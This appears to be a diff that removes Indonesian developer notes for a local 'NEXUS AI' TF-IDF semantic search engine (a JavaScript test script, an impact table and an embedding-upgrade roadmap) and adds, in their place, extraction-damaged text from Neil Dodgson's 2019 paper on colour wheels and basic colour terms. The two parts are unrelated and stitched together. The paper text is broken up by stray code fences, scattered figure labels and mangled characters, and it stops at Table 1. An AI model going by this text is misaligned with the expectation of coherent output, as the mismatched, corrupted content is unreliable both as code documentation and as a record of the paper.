-Setelah implementasi, test dengan command ini di root NEXUS AI:
-
-```javascript
-// Buat file test: test-vector.js
-const SemanticEngine = require("./agent/core/SemanticEngine");
-const path = require("path");
-
-async function test() {
-  const hubPath = path.join(__dirname, "memory", "distilled");
-  const engine = new SemanticEngine(hubPath);
-
-  await engine.buildIndex();
-
-  // Test 1: Security query
-  const r1 = await engine.search("authentication token security", 3);
-  console.log('\n🔎 Query: "authentication token security"');
-  r1.forEach((r) => console.log(`   ${r.score.toFixed(2)} — ${r.file}`));
-
-  // Test 2: Database query
-  const r2 = await engine.search("migration schema eloquent", 3);
-  console.log('\n🔎 Query: "migration schema eloquent"');
-  r2.forEach((r) => console.log(`   ${r.score.toFixed(2)} — ${r.file}`));
-
-  // Test 3: Multi-domain query
-  const r3 = await engine.search("livewire form validation security", 3);
-  console.log('\n🔎 Query: "livewire form validation security"');
-  r3.forEach((r) =>
-    console.log(`   ${r.score.toFixed(2)} — ${r.file} [${r.tags.join(", ")}]`),
-  );
-}
-
-test().catch(console.error);
+lenge for the educator is in explaining these differences.
+These differences can be downplayed in educational
+material. For example, one text for art students states that
+“Colour wheels must always have an even number of hues
+and that number must be divisible by three. Any other com-
+bination would not be a true and accurate colour wheel” [Ble12,
+p.66, emphasis mine]. This is a simplification by the author
+for the benefit of the students, as the author is well aware
+of the NCS and Munsell colour systems which have four
+School of Engineering and Computer Science, Victoria University of
+Wellington, Wellington, New Zealand e-mail: neil.dodgson@vuw.ac.nz
+yellow
+primary
+red
+primary
+blue
+primary
+green
+secondary
+orange
+secondary
+purple
+secondary
+Fig. 1. An Itten colour wheel with twelve hues. The three primaries, red,
+yellow, and blue, combine to make three secondaries, green, orange,
+and purple. Each primary combines with its neighbouring secondaries
+to make six tertiary colours.
 ```
-
-```bash
-node test-vector.js
+(a) (b) (c)
 ```
-
----
-
-## 📊 Expected Impact
-
-| Metrik                       | Sebelum (v3.1) | Setelah (v3.2)          |
-| :--------------------------- | :------------- | :---------------------- |
-| Search accuracy (30 files)   | ~70%           | ~85%                    |
-| Search accuracy (100+ files) | ~40%           | ~80%                    |
-| Multi-label tagging          | ❌ Single only | ✅ Multi-label          |
-| Search by natural language   | ❌             | ✅                      |
-| RAM overhead                 | ~1MB           | ~15-50MB                |
-| Index build time             | 0ms            | ~200-500ms (cached)     |
-| Cache reuse                  | ❌             | ✅ 1 jam                |
-| Rebuild trigger              | Manual         | ✅ Auto setelah distill |
-
----
-
-## 🚀 Roadmap Lanjutan (Post v3.2)
-
-Setelah vector search ini stabil dan 100 project selesai, tahap berikutnya:
-
-**Phase 5 — Embedding Upgrade**
-
-Kalau HUB sudah 500+ file, upgrade dari TF-IDF ke lightweight embedding model:
-
-```bash
-npm install @xenova/transformers
-# Model: Xenova/all-MiniLM-L6-v2
-# Size: ~25MB, RAM: ~200MB
-# Accuracy: jauh lebih tinggi untuk semantic similarity
 ```
-
-Ini tetap jalan lokal, tanpa cloud, dan masih aman di 8GB RAM.
+(d) (e) (f )
+```
+```
+Fig. 2. The artist’s harmonious colour combinations: (a) complementary,
+```
+```
+(b) split complementary, (c) triadic, (d) tetradic rectangle, (e) tetradic
+```
+```
+square, (f) analagous. (b)–(e) are from Itten [Itt70, Figs. 54, 55].
+```
+and five principal colours [Ble12, p.31] and which have a
+well-defined notation for describing colours around the hue
+wheel.
+One of the reasons to question the received wisdom
+is that almost all art texts, inspired ultimately by Itten’s
+seminal work [Itt70], use angles on the colour wheel to
+```
+determine “harmonious” colour combinations (Figure 2). If
+```
+What is the ‘opposite’ of ‘blue’?
+the language of colour wheels
+Neil A. Dodgson
+```
+pre-print of a paper in Journal of Perceptual Imaging 2(1), Jan-Jun 2019
+```
+©2019 Society for Imaging Science & Technology
+```
+https://doi.org/10.2352/J.Percept.Imaging.2019.2.1.010401
+```
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 2
+Fig. 3. An NCS colour wheel with four principal hues [HST96] [NCS18]
+[Swe89]. The four principals are red, yellow, green, and blue. The
+circle is divided into 400 units, 100 between each pair of principals.
+Hues between the principals are indicated by numeral between the two
+principals’ initial letters. In this chart we see units every ten steps for
+each of the four quadrants.
+the colour wheel is not immutable, as the different colour
+wheels suggest, then these harmonies rest on insecure foun-
+dations. This is by no means a new problem [Ber81, Ch.6B]
+[Bri07]. Some of the difference between the different colour
+wheels can be explained from the principles underlying
+their constructions and the uses for which they are designed.
+There is difference in how you construct your colour space
+depending on whether you are mixing coloured lights,
+mixing coloured pigments, or dealing with human visual
+perception [Der91]. For example, Itten’s artist’s colour wheel
+```
+is based in subtractive colour mixing of pigments; opponent
+```
+```
+colour theory is based in visual perception; and Munsell
+```
+was aiming to bring clarity to colour communication by
+establishing an orderly system for accurately identifying
+all colours. All the colour spaces discussed in this paper
+are ways of specifying or mixing colours so all can be
+considered ways of dealing with pigment.
+The contribution of this paper is to argue that our under-
+standing of colour wheels is mediated by the terms we use
+to describe colours, in particular in the use of basic colour
+terms [BK69]. This leads to some of the apparent differences
+between colour wheels in two ways. First, generally across
+all colour wheels, we use the same basic colour name, such
+as blue, to represent subtly different colours in different
+```
+wheels (Section 5), which confuses the student. Second, and
+```
+```
+specific to the artist’s colour wheel (Figure 1), while the
+```
+```
+artist’s (RYB) and printer’s (CMY) colour wheels should
+```
+both be identical, because they are both subtractive colour
+mixing models, I argue that the differences between them
+are largely owing to the artist’s colour wheel being actively
+driven by basic colour terms in a way that puts it at odds
+with the optimal physical colour mixing embodied in the
+```
+printer’s colour wheel (Section 6).
+```
+10Y
+5GY
+10GY
+5G
+10G
+5BG
+10BG
+5B
+10B5PB10PB
+5P
+10P
+5RP
+10RP
+5R
+10R
+5YR
+10YR5Y
+Fig. 4. A Munsell colour wheel with five principal hues and five inter-
+mediate hues [Mun76] [Mun18]. The five principal hues are red, yellow,
+green, blue and purple. The intermediates are indicated by combinations
+```
+of the colour letters (e.g., YR=yellow-red). The wheel is further subdi-
+```
+vided into ten sections for each principal and intermediate, indicated by
+numerals. In this chart we see the 5 and 10 units for each of the ten
+sections. The “5” unit is the prototypical version of each hue. The “10”
+unit is a half-and-half mix of the hues either side. Image used under a
+Creative Commons 3.0 license from WikiMedia author Thenoizz.
+I first give a summary of the history of colour spaces and
+```
+colour wheels (Section 2), then a history of colour naming
+```
+and an outline of Berlin and Kay’s theory of basic colour
+```
+terms (Section 3). I describe five of the most commonly
+```
+```
+used colour wheels (Section 4). I demonstrate that impre-
+```
+cise use of colour names explains a substantial amount of
+the apparent inconsistencies between the different wheels
+```
+(Section 5), allowing us to reconcile these differences. This
+```
+leads to the observation that the technical colour wheels
+are broadly consistent with one another, provided we are
+precise about our specification of the principal colours in
+those spaces, but that the standard artist’s colour wheel
+is substantially different from the technical colour wheels
+```
+(Section 6), because its primary and secondary colours are
+```
+so strongly related to use of basic colour terms in English.
+2 HISTORY
+Colour has fascinated philosophers and artists since antiq-
+uity but it is only in the last century that we have come to
+understand the psychophysical and biological mechanisms
+of colour vision, so early writers could be said to be working
+in the dark. Aristotle described seven principal colours
+```
+(white, yellow, red, violet, green, dark blue, black) which
+```
+he considered all to be mixes of white and black [Sha94], a
+misconception that started to be challenged in the fifteenth
+century [Alb66] but still held some sway until the eighteenth
+century. The discovery that red, yellow and blue are the
+artist’s primaries was made in the early seventeenth century.
+Shapiro cites Parkhurst and Gage as reporting that four
+scholars independently discovered the artist’s tri-chromatic
+primaries. All four scholars were conversant with both art
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 3
+and the natural sciences, giving them access to the under-
+standings needed to make this discovery. Shapiro asserts
+that it “. . . was the most important discovery in colour
+before Newton’s own theory” [Sha94, p.624].
+In the late seventeenth century, Newton conducted ex-
+tensive investigations into the nature of colour, discovering
+that white light split into an infinite range of colours: the vi-
+sual spectrum. This discovery was at odds with the widely-
+held belief that white was “pure” and could not be split
+and also at odds with the three primary colours discovered
+earlier that century, discrepancies that caused him much
+trouble to attempt to reconcile and which led to substantial
+challenges in his work being accepted. Neverthless, in his
+writings before Opticks, whenever he listed his principal
+colours of the spectrum, he always added some phrase
+such as “with their innumerable intermediate gradations”
+to indicate that there were countless discernible colours, but
+in Opticks he omits to say this in all but one place, possibly
+in an attempt to placate his critics [Sha94, p.619]. Newton’s
+early work described five principal colours: red, yellow,
+green, blue and purple, but he later added orange and
+indigo, leading to English’s current seven-colour rainbow
+```
+(see longer discussion in the Appendix).
+```
+At the start of the nineteenth century, Goethe launched
+a challenge on Newton’s purely physical approach, tackling
+colour instead as a perceptual phenomenon. To a technically
+trained modern, some of Goethe’s arguments can seem mis-
+guided when compared with Newton’s empiricism. But
+Newton was, in his own way, blinkered: fitting the data to
+suit his hypothesis rather than the other way round [Pla06]
+[Rib85]. The challenge Newton faced was that his evidence
+was inconsistent, because he was assuming that mixing
+```
+lights (additive colour mixing) and mixing pigments (sub-
+```
+```
+tractive colour mixing) should produce consistent results.
+```
+It was only in 1852 that Helmholtz deduced that different
+rules apply to the mixing of pigments and of lights [Sha94].
+In additive colour mixing, different coloured lights are used,
+each with its own spectrum. The mix of the lights is a
+spectrum that is the weighted sum of the spectra of the
+individual lights, weighted by the intensity of the lights.
+Additive colour is used in display devices and the usual
+primary colours used are a red, a green, and a blue. This is
+in contrast to subtractive colour mixing, in which coloured
+pigments, inks, paints or dyes are mixed together. Each
+pigment absorbs some part of the spectrum of light. The mix
+of pigments absorbs a weighted sum of the absorptions of
+the individual pigments. Subtractive colour mixing is used
+in painting, printing and dyeing [Ber81].
+The chemist, Chevreul, dyemaster at the Gobelin work in
+Paris, published De la Loi du Contraste Simultan´e des Couleurs
+et de l’Assortiment des Objets Coloris in 1839 [Itt70]. This, and
+other emerging colour theories, had substantial influence
+on artists in the nineteenth and early twentieth centuries.
+Itten says that “Delacroix. . . is the founder of the tendency,
+among modern artists, to construct works upon logical, ob-
+jective colour principles, so achieving a heightened degree
+of order and truth.” [Fry06, p.418]. The Impressionists and
+Post-Impressionists, in particular, used theories of colour
+contrast and optical colour mixing.
+Several early commentators on colour, including da
+Vinci, noted that there appear to be four fundamental
+```
+colours: red, yellow, green and blue, in addition to black
+```
+and white [Har06]. Hering formalised this into the opponent
+theory of colour vision [Der91] [HJ57]. Hering’s theory was
+further developed by H˚ard, Sivik and Tonnquist in their
+```
+creation of the Natural Colour System (NCS) [HST96]. There
+```
+is evidence that the four opponent principal colours are
+physiologically determined [Gou91] [Har05]. Hering’s the-
+ory was not widely embraced at the time because there was
+no understanding of how responses to two different colours
+of light could interact to create a colour-opponent signal. We
+know today that the neurons in the retina process the out-
+puts of the light-sensitive cones to produce three channels
+of data to the brain: a high resolution luminance channel,
+a lower-resolution red-green channel and an even lower-
+resolution blue-yellow channel [Ber81, p.16] [HJ57]. The
+opponent colour channels explain well several features of
+human vision, including the way in which colour blindness
+manifests and the complementary afterimages caused after
+fixating on a coloured field. Consistent with this theory is
+that you cannot perceive a colour as having simultaneously
+components from either end of an axis, so a yellowish-green
+and a bluish-green both make sense, but a human can never
+perceive a colour that is “reddish-green”, such a mixture
+being a nonsense.
+Over far more than a century, philosophers, scientists
+and artists have grappled with ways to represent and under-
+stand colour, leading to many systems of colour representa-
+tion. Basic introductions can be found in computer graphics
+and design texts [FvDFH90, Ch.13] [JMF94] [SAM09, Ch.20–
+22] [Sto03], with more detailed explanations in specialist
+texts [Ber81] [Ble12] [Bri07] [KB96], and a full history of
+colour spaces in Kuehni and Schwartz’s 2008 book [KS08].
+A colour space is a three-dimensional representation
+of colour. We can restrict ourselves to three dimensions
+because the human visual system has three types of receptor
+for colour vision. All of the colour spaces are mathematical
+transformations of one another. Hunter gives a detailed
+history of nineteen colour spaces developed in the attempt
+to create a perceptually uniform space, starting with the CIE
+1931 colour space and Munsell’s original system, through
+to the CIELUV and CIELAB systems of 1976 [Hun75,
+Ch.8]. Derefeldt gives the background of the most impor-
+tant colour appearance systems, including Munsell, NCS,
+CIELAB and CIELUV. She gives their basic attributes, and
+the principles for scaling and notation of the variables. In
+particular, she makes a comparison of the hue spacing of
+the different spaces [Der91]. Note that there is considerable
+evidence that colour vision is non-Euclidean, so any colour
+space is not going to be a metric space, perceptually [Ber81,
+p.64]. For example, the CIELAB system has a cube-root
+relationship with the signals that are received by the cones
+in the human eye. This is to better match the perceptual
+response of the human visual system but means that linear
+mixes in the CIELAB system do not necessarily match mixes
+of pigments.
+A colour wheel is a representation of one dimension
+of a colour space: hue. Colour wheels have been used
+for centuries. The earliest known drawing of a colour
+wheel dates from 1611 [PF82], a century before Newton’s
+Opticks [New04].
+A colour wheel or, more accurately, a hue wheel, is a
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 4
+circle that passes through all of the spectral colours and then
+through the purples to join the two ends of the spectrum
+```
+(Figure 1). Hue is explicitly one of the three dimensions in
+```
+```
+some colour systems, including NCS (Figure 3) and Munsell
+```
+```
+(Figure 4), and is implicit in others, where hue is a function
+```
+of two or three of the principal dimensions of the space.
+```
+For example, in the case of CIELAB, h◦ = tan−1(b∗/a∗).
+```
+When considering a colour wheel, the hues always appear
+in the same order around the wheel but they differ in which
+hues appear opposite each other and in the relative angular
+separation of pairs of hues.
+A student may make an assumption that a “true” colour
+wheel exists and that the different colour wheels essentially
+stretch or contract sections of the “true” wheel to fit their
+predilections, as if the colours were painted on a rubber
+bicycle wheel and we nailed certain hues to certain points
+on the rim. The stretching and contracting is epitomised
+in the differences in the angles red–yellow and green–blue,
+shown in Table 1. When a colour wheel is used as a mech-
+anism to describe hue, then such stretching or contracting is
+```
+fair: the wheel is not purporting to show precise physical
+```
+relationships. However, when a colour wheel is used to
+describe relationships or mixes between distant hues, such
+as in defining the “opposite” of a hue or “harmonious
+```
+colour combinations” (Figure 2), then this stretching and
+```
+contracting becomes questionable.
+3 BASIC COLOUR TERMS
+Berlin and Kay proposed the theory that there are basic
+colour terms in all languages [BK69]. These are the terms
+that you teach small children and which produce categories
+of colour that are irreducible, that is, all other colour terms
+are considered, by most speakers of the language, to be
+variations on these basic colour terms.
+In antiquity, classical scholars certainly privileged certain
+colours above others. In the distant past, the fundamental
+colours appear to have been severely limited. Berlin and
+Kay quote Geiger as suggesting that “Democritus and the
+Pythagoreans [fifth century BC] assumed four fundamen-
+tal colours, black, white, red and yellow” [BK69, p.136].
+Elsewhere, Geiger comments that Aristotle [fourth century
+BC] “in his ‘Meteorology’ calls [the rainbow] tri-coloured,
+viz., red, yellow, and green” [Gei80, p.57]. By the fifteenth
+century, things had developed a little further. Alberti cites
+three fundamental colours: red, green, blue, combined with
+grey [Alb66, Book I, paragraph 9] while da Vinci lists what
+we now call the colour opponent set of principal colours:
+red, yellow, green, blue [Har06]. In the seventeenth century,
+Boyle listed the standard artist’s primaries: red, yellow and
+blue [Har06], but added green and purple when actually
+conducting his experiments on colour [Boy64, p.187]. In
+the early eighteenth century, Newton started with these
+five principal colours: red, yellow, green, blue and purple,
+```
+then added orange and indigo (see longer discussion in the
+```
+```
+Appendix).
+```
+There is a question of nature versus nurture: how much
+the colour categories are inherent in our psychophysiology
+and how much they are cultural constructs. There is good
+evidence that black, white, yellow, red, blue, and green are
+strongly tied to the perceptual mechanisms in the human
+brain [Har05]. Hardin notes that the four principal colours
+```
+(yellow, red, blue, green) “. . . prove to be both necessary and
+```
+sufficient for an English speaker to describe any spectral
+stimulus” [Har98]. The other basic colour categories may
+be more culturally determined. Children are able to match
+and discriminate colours long before they have consistently
+codified the boundaries in colour space of the basic colour
+terms, so providing evidence that the boundaries are a
+social construct [ATF86]. In any case, in order to commu-
+nicate clearly between members of a language group, the
+learnt categories must be at least partly a social construct,
+reinforced by parents, kindergartens and primary schools
+because all members of the language group broadly agree
+on them.
+Berlin and Kay identified that the number of basic colour
+```
+terms range between two (representing light and dark
+```
+```
+colours) and twelve, depending on the language. In English
+```
+there are eleven basic colour terms: red, orange, yellow,
+green, blue, purple, pink, brown, black, grey and white.
+As an example of the irreducibility of these basic terms,
+consider how difficult it is to convince a child that brown
+is really “dark orange” or that pink is “light red” [Har98,
+p.210]. You may teach a particular child or student to make
+finer distinctions, as between “cyan”, “azure”, “indigo” and
+“turquoise”, but there is a cultural push towards teaching
+and agreeing on the eleven basic colour terms [KB96, Ch.11],
+and there is demonstrated effect of these basic categories on
+the ability to perform colour discrimination [WWF+07]. The
+maximum number of basic colour terms in any langague
+appears to be twelve. Russian, and a few other languages,
+```
+distinguish light blue (Russian goluboy) from dark blue (Rus-
+```
+```
+sian siniy) [Par05]. This paper considers the case of English
+```
+though most other European languages use the same eleven
+categories, which is important to our discussion because
+Itten, in particular, was working in German.
+Rather than conducting new perceptual experiments,
+we are able to make use of results from three previous
+studies [BK69] [RDD00] [RH72], which used colour chips
+evenly chosen from Munsell’s colour space.
+Ignoring the monochrome black, grey and white, there
+are eight basic colour terms in English. Roberson et
+al. [RDD00] experimented with an array of 160 coloured
+chips, evenly spaced within the Munsell colour system,
+asking English speaking subjects to categorise each chip into
+one of the eight colour categories.
+Figure 5 shows the mean colour chosen by subjects for
+each colour chip. In addition, each colour region contains a
+small cross that marks the “best-example choice” for each
+of the eight colours, as described by Rosch [RH72]. Notice
+the difference in sizes of the different colour terms: orange
+```
+(5.5 cells), yellow (6.5 cells) and brown (9 cells) each take
+```
+up only a small part of the colour space compared with
+```
+green (52.5 cells) and blue (36 cells). While I acknowledge
+```
+that Munsell’s colour space is non-uniform and is somewhat
+compressed in the yellow-red area and expanded in the
+blue-green area, that cannot explain the full magnitude of
+this difference. Over 50% of the chart is categorised as one
+```
+of two terms blue and green; by contrast, red, orange and
+```
+```
+yellow between them take up just 14% of the chart (see
+```
+also Hardin’s comments on the relatively small sizes of the
+“warm” colours’ regions compared with the relatively large
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 5
+5R 10R 5YR 10YR 5Y 10Y 5GY 10GY 5G 10G 5BG 10BG 5B 10B 5PB 10PB 5P 10P 5RP 10RP
+9
+8
+7
+6
+5
+4
+3
+2
+yellow
+orange
+brown
+red red
+purple
+bluegreen
+pink
+pink
+```
+Fig. 5. Roberson, Davies and Davidoff’s diagram of the eight basic colours in English (redrawn from [RDD00, Fig.1a]). The colour space is that of
+```
+```
+the Munsell colour system, which has five principal colours, red (R), yellow (Y), green (G), blue (B), purple (P), and their various combinations along
+```
+```
+the horizontal axis, with brightness on the vertical axis (2=dark, 9=light). See Figure 4 for an explanation of the notation. The experiments used a
+```
+160 chip Munsell array and the array shows, for each of the 160 cells, the mean colour chosen by English speakers for each colour chip. Some
+cells lie on the boundary, in which case the boundary passes through the centre of the cell. The small crosses mark the “best-example choices”
+for each of the eight colours, as described by Rosch [RH72]. The colour of each area matches that best-example choice, within the limits of the
+```
+available gamut. The “best-example choices” are taken directly from Rosch’s 1972 paper [RH72]; the locations of several of these “best examples”
+```
+are placed incorrectly in Roberson et al’s 2000 paper [RDD00, Fig.1a].
+5R 10R 5YR 10YR 5Y 10Y 5GY 10GY 5G 10G 5BG 10BG 5B 10B 5PB 10PB 5P 10P 5RP 10RP
+9
+8
+7
+6
+5
+4
+3
+2
+yellow
+orange
+brown
+red purple
+bluegreen
+pink
+```
+Fig. 6. Berlin and Kay’s diagram of the eight basic colours in English (redrawn from [BK69, Appendix I, p.119]). As in Figure 5, the colour space
+```
+is that of the Munsell colour system. See Figure 4 for an explanation of the notation. Berlin and Kay used a 320 chip Munsell array. They asked
+```
+participants to determine, for each basic colour term, x, (1) all those colour chips which they would, under any conditions, call x, and (2) the best,
+```
+most-typical examples of x. The small crosses mark the locations of the “best, most-typical example” for each colour. The colour of each area
+matches that best most-typical example, within the limits of the available gamut. The white areas represent colour chips that were not given an
+unequivocal colour name.
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 6
+```
+sizes of the “cool” colours’ regions [Har05]). Describing a
+```
+colour as “red”, “orange” or “yellow” will always give a
+colour close to the “best-example choice”, that is, the colour
+will be close to what an average person would imagine it to
+be. By contrast, describing a colour as “green” or “blue” can
+give a colour that is a significant distance from the “best-
+example choice”. Hardin discuses the consistency of such
+studies, noting that, across the many studies,“No matter
+how many basic color terms languages might have, their foci
+[“best-example choices”] tend to cluster reliably in relatively
+narrow regions of the [Munsell] array, whereas boundaries
+are drawn unreliably, with low consistency and consensus
+for any language.” [Har98, p.208]. As evidence that there
+is consistency between observers, consider that the NCS
+colour system is predicated on there being good agreement
+between observers on what Berlin and Kay call the “best,
+most-typical example” of the four principal colours red,
+yellow, green and blue [HST96].
+Berlin and Kay undertook a different experiment [BK69],
+using a 320 Munsell chip array, in which, for each basic
+colour term, they asked English speaking subjects to select
+all those chips that they would, under any conditions, cate-
+gorise as being of that colour. Figure 6 shows the regions in
+which they got an unequivocal response from their subjects.
+One important result, for our investigation, from Berlin and
+Kay’s work is that both cyan and indigo were unequivocally
+described as “blue” by their subjects.
+Note that pink and brown do not appear on the standard
+colour wheel. Pink is a light variant of red. Brown is a dark
+variant of orange. The basic English colour terms along the
+visual spectrum are thus red, orange, yellow, green, blue
+and purple. Of these, orange is a relatively recent addition
+```
+to the basic colour terms in English. Red (Old English r´eod),
+```
+```
+yellow (geolu), green (grene) and blue (blaw) are all ancient
+```
+colour terms. Purple was brought into English, from the
+Latin, in the ninth century. Orange, by contrast, was adopted
+only in the early sixteenth century. Its first attested use as a
+colour name was in 1512. Prior to this it had been known
+```
+as yellow-red (Old English geolur´eod). It is unclear when
+```
+orange became a basic colour term in English, but it is a
+possibility that Newton’s description of the spectrum was
+an influence. Similarly, in German, gelb, rot, blau, and gr ¨un
+are ancient terms with words for orange and purple being
+more recent [Jon13].
+4 THE COLOUR WHEELS
+Figure 7 illustrates the principal colours of five colour
+wheels in common use. It is immediately obvious that they
+do not map linearly to one another. The colour that is dia-
+```
+metrically opposite to blue ranges from yellow (Fig. 7(a),(c))
+```
+```
+through orange (Fig. 7(b),(d)) to a red-orange (Fig. 7(e),
+```
+```
+but see also the Appendix). I briefly describe each of the
+```
+five colour spaces, including the purposes for which it was
+designed and the principal colours it uses.
+```
+4.1 Opponent colour spaces, RYGB, Figure 7(a)
+```
+The opponent colour spaces are based on the perceptual op-
+ponent colours of Hering. The opponent principal colours,
+RYGB, are used in the CIELAB colour space [Ber81, p.67],
+which is designed to be a reasonably uniform space, per-
+```
+ceptually (see Section 2), and in the Natural Colour System
+```
+```
+(NCS) [HST96] [Ber81, p.39] [Fai05, p.99] [NCS18] [Swe89]
+```
+```
+(Figure 3), which is designed for specifying colour in a
+```
+similar manner to Munsell’s colour system but, in the case
+of NCS, using the observer’s in-built understanding of what
+is meant by a “pure” red, yellow, green, blue, black and
+white [NCS18]. Derefeldt notes that “The development of
+the NCS began by psychometric testing of Hering’s con-
+ceptual framework having observers estimate qualitative
+colour attributes by assuming that observers could imagine
+six elementary colours by means of verbal definitions only.
+These imaginary colours, which constitute cognitive, natural
+reference points, were used as references in absolute judg-
+ments without any physical representation of the references.
+. . . The definitions of the six elementary colours. . . follow
+Hering’s definitions of primary colours closely.” [Der91,
+p.234].
+Both CIELAB and NCS are used for specifying colour
+rather than purporting to represent colour mixing. Because
+CIELAB is non-linear, a linear mix in CIELAB space will not
+necessarily create the same colour as mixing matching pig-
+ments. Because NCS is entirely perceptual, there is, again, no
+guarantee that a linear mix of two NCS colours will match
+the mix of two pigments. The principal colours, RYGB, are
+four of Berlin and Kay basic colour terms.
+```
+4.2 Munsell colour system, RYGBP, Figure 7(b)
+```
+The five principal colours in this space are those used by
+Boyle in his seventeenth century colour experiments [Boy64,
+p.187] and are the original five colours of the rainbow spec-
+ified by Newton. Munsell formalised this in the early twen-
+tieth century, using the “. . . guiding principal of equality of
+visual spacing” [Ber81, p.36]. The colour space was designed
+to aid in colour specification, originally for schoolchildren.
+The specific colours of the five principal hues were deter-
+mined visually. Munsell’s colour order system was exten-
+```
+sively reworked (“renotated”) in the 1940s by the Optical
+```
+Society of America. This was a painstaking process of mea-
+suring the discriminability of the colors and adjusting the
+spacing of the colours to optimize them for use in science
+and industry [Mun76] [Mun18]. It should be made clear that
+Munsell’s space is not a uniform colour space: small steps
+should be roughly equal visually but large steps cannot be
+compared. Berns implies that having five principal hues
+leads to greater visual equality between neighbouring hues
+than a system based on the four principal unique hues of
+red, green, yellow, and blue [Ber81], though Kaiser and
+Boynton suggest that there is evidence that the Munsell
+principal hues are not necessarily spaced evenly perceptu-
+ally, in particular that P and PB are too far apart [KB96,
+p.494]. All five principal hues are Berlin and Kay basic
+colour terms.
+```
+4.3 Printer’s colour wheel, RYGCBM, Figure 7(c)
+```
+This is the most pragmatic of the colour wheels, relat-
+ing directly to how printing works. The colour space is
+explicitly designed for colour mixing. The three principal
+colours, cyan, magenta and yellow, are the primaries of
+subtractive colour mixing, as used in printing. Each primary
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 7
+R
+BP
+Y
+G
+R
+B
+Y
+G
+P
+O
+Y
+G
+RB
+R
+B
+Y
+G
+CM
+```
+(a)(b)(c)(d)(e)
+```
+I
+R
+V
+O
+Y
+G
+B
+Fig. 7. Representations of the principal colours of five colour wheels, as they might be constructed by a student. All colours are represented by
+their initial letter: Red, Orange, Yellow, Green, Cyan, Blue, Indigo, Purple, Violet, Magenta. All colour names are taken at face value. Left to right:
+```
+(a) colour opponent theory, with four principal colours, RYGB; (b) Munsell’s colour system with five principal colours, RYGBP; (c) the printer’s colour
+```
+```
+wheel with the three subtractive primaries for colour printing CMY and their three secondaries RGB, RYGCBM; (d) the artist’s colour wheel with
+```
+```
+the three painting primaries RYB and the three secondaries OGP, ROYGBP; (e) Newton’s colour wheel, with the seven colours of the rainbow,
+```
+```
+ROYGBIV, notice that Newton’s colours are not evenly spaced round the wheel (see Appendix).
+```
+is physically realised as a pigment that absorbs certain
+wavelengths of light. When two primaries are mixed or
+superimposed, the mixture absorbs the wavelengths that
+are absorbed by each pigment in proportion to the amounts
+of each primary mixed. The specific primaries chosen are
+pigments that, when mixed, allow production of a large
+gamut of colours. Good choices for primaries, that produce
+close to the largest gamut achievable with three pigments,
+are broadband yellow, broadband cyan, and broadband ma-
+```
+genta (see Section 6). Mixing each pair of primaries produces
+```
+the three secondaries, which are called red, green and blue,
+although these turn out to be rather imprecise descriptions
+```
+(see Section 5.6). While four of these six colours are Berlin
+```
+and Kay basic colour terms, it is important to our discussion
+that cyan and magenta are not. As a consequence, cyan
+and magenta are relatively precise terms, and each is well-
+localised in colour space compared to say, blue or green.
+```
+4.4 Artist’s colour wheel, ROYGBP, Figure 7(d)
+```
+```
+This is the wheel that Itten exemplified (Figure 1) [Itt70].
+```
+This colour wheel has been known for over two centuries,
+but Itten’s work in the 1950s and ’60s pushed it to preem-
+inence. Prior to Itten, other colour wheels had been used
+in art teaching. For example, an opponent-colour system
+designed by Wilhelm Ostwald was used in British art educa-
+tion between the two world wars, in which the colour wheel
+had four principal colours, though Ostwald used a bluish-
+green opposite red [Bri07, Sec.7.3] rather than the pure green
+used by NCS and Hering. Itten, by contrast, designed his
+colour wheel on the foundations that there must be three
+primaries and that diametrically-opposite colours must mix
+to grey [Itt70, p.21]. Briggs comments on how pervasive
+Itten’s influence has become: “Itten’s book [The Art of Colour
+```
+(1961)] has been so influential that it defines the limits of
+```
+artistic colour theory for the majority of sources on the
+internet today. . . As a result of its half century of ascendancy,
+many artists today assume that traditional colour theory
+has dominated art education continuously since its origins,
+and assume modern colour theory is a very recent intru-
+sion” [Bri07, Sec.11.3]. Itten himself developed the concepts
+```
+of harmonious combinations of colour (Figure 2), which
+```
+are specified by precise angular relationships around the
+colour wheel. The artist’s colour wheel is used to help artists
+understand colour relationships and colour mixing. Red,
+```
+yellow and blue are the primary colours (in which primary
+```
+is used in the same sense as in the printer’s colour wheel,
+```
+Section 4.3), mixing to make the three secondaries: orange,
+```
+green and purple. All six of the primary and secondary
+```
+colours are Berlin and Kay basic colour terms (see Section 6
+```
+```
+for a discussion of the implications of this).
+```
+```
+4.5 Newton’s rainbow, ROYGBIV, Figure 7(e)
+```
+This is the prototypical early colour wheel, from when
+evidence was beginning to be gathered about how coloured
+light and colour mixing worked. It is misguided in several
+```
+respects (see the Appendix). Newton originally described
+```
+the rainbow as having five colours, the same five that Mun-
+sell used two centuries later, but Newton quickly adopted
+```
+two extra colours (orange and indigo) to make the seven
+```
+colour rainbow that is taught in all English-language pri-
+mary schools. His colour wheel is not evenly spaced and
+his use of the terms “blue” and “indigo” do not match
+their modern uses but this colour wheel has gained almost
+unstoppable traction in English education about colour, to
+the confusion of many students. Newton’s rainbow has the
+same colours as the artist’s colour wheel plus indigo.
+5 RECONCILING THE DIFFERENT COLOUR WHEELS
+Consider the structure of the various colour wheels as a
+```
+student would view them. Figure 7(a)–(d) shows the result
+```
+if you place the principal colours evenly spaced around
+the wheel, as they are in all diagrams in the student’s text
+```
+books (e.g., Figures 1, 3, 4). Table 1 tabulates the angle a
+```
+student would measure between red and yellow and that
+between green and blue. The red-yellow angle varies from
+```
+60◦ (Figure 7(c)) to 120◦ (Figure 7(d)), while the green-blue
+```
+```
+angle varies from 120◦ (Figure 7(c)) to 60◦ (Figure 7(d)). In a
+```
+non-metric space, these angles are, at best, approximate, but
+a student will still worry about why the angular distances
+around the wheels differ so markedly, especially if they
+have been trained to build the harmonious colour combi-
+nations of Figure 2, which explicitly require consideration
+of angle. They will also be concerned to understand why
+diametrically-opposite colour pairs differ between colour
+spaces.
+5.1 What is meant by “opposite”?
+Let us return to the question “what is the opposite of
+blue?”. The discussion above has implicitly assumed that
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 8
+TABLE 1
